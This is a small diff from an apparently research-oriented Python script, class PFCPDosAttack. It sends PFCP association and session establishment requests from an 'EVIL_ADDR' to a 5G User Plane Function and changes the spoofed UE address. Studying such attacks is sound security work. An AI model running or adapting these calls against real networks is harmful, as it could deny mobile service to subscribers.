@@ -281,5 +281,5 @@ class PFCPDosAttack:
 # TODO: Utiliser le bon plan d'adresse
 ezpfcp = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 ezpfcp.Send_PFCP_association_setup_req()
-ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="10.100.200.66")
-
+# ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="10.100.200.66")
+ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.2.6")
